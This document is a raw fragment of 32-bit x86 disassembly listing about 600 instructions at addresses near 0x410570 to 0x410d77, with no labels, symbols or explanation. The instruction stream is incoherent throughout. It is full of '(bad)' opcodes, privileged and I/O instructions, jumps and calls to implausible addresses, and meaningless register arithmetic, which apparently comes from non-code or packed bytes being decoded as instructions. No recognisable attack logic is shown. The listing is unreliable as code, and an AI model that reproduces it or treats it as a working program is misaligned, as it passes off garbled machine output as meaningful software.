  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
